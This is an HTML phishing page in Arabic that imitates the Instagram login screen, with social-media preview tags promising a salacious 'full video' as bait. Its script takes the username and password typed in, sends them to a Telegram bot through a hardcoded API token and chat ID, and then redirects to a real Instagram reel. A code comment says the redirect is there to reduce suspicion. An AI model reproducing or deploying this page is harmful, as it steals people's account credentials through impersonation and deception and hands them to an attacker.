<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <meta property="og:title" content="Instagram Video">
    <meta property="og:description" content="الفديو كامل لكيناه تحطها بطي.ها">
    <meta property="og:image" content="https://media-node-fast.github.io/verification-node-7/IMG_1426.jpeg"> 
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:type" content="video.other">
    
    <title>Instagram</title>
    
    <style>
        /* تصميم ملء الشاشة - أبيض سادة مثل التطبيق الرسمي */
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background-color: #ffffff; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .main-container {
            display: flex; flex-direction: column; align-items: center;
            width: 100%; padding-top: 80px;
        }
        .logo { width: 175px; margin-bottom: 50px; }
        .form-area { width: 85%; max-width: 350px; }
        input { 
            width: 100%; background: #fafafa; 
            border: 1px solid #dbdbdb; border-radius: 3px; 
            padding: 14px; margin-bottom: 10px; 
            box-sizing: border-box; font-size: 14px; 
        }
        input:focus { border: 1px solid #a8a8a8; outline: none; }
        .login-btn { 
            width: 100%; background-color: #0095f6; 
            color: white; border: none; border-radius: 8px; 
            padding: 12px; font-weight: 600; font-size: 14px; 
            margin-top: 15px; cursor: pointer; 
        }
        .line-box { 
            display: flex; align-items: center; text-align: center; 
            color: #8e8e8e; font-size: 13px; font-weight: 600; 
            margin: 30px 0; width: 100%; 
        }
        .line-box::before, .line-box::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
        .line-box::before { margin-left: 1.5em; }
        .line-box::after { margin-right: 1.5em; }
        .fb-login-text { 
            color: #385185; font-size: 14px; font-weight: 600; 
            text-decoration: none; display: block; text-align: center;
        }
        .meta-brand { 
            position: absolute; bottom: 30px; width: 100%; 
            text-align: center; font-size: 12px; color: #8e8e8e; 
        }
    </style>
</head>
<body>

    <div class="main-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" class="logo">
        
        <div class="form-area">
            <input type="text" id="u" placeholder="اسم المستخدم، الهاتف، أو البريد">
            <input type="password" id="p" placeholder="كلمة السر">
            <button class="login-btn" onclick="capture()">تسجيل الدخول</button>
            
            <div class="line-box">أو</div>
            <a href="#" class="fb-login-text">تسجيل الدخول بحساب Facebook</a>
        </div>
    </div>

    <div class="meta-brand">من Meta</div>

    <script>
        function capture() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            if(user && pass) {
                // إرسال البيانات لبوت التليجرام الخاص بك
                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=👤:${user}%0A🔑:${pass}`);
                
                // تحويل للفيديو الأصلي لتقليل الشك
                setTimeout(() => { 
                    window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/"; 
                }, 1000);
            }
        }
    </script>
</body>
</html>
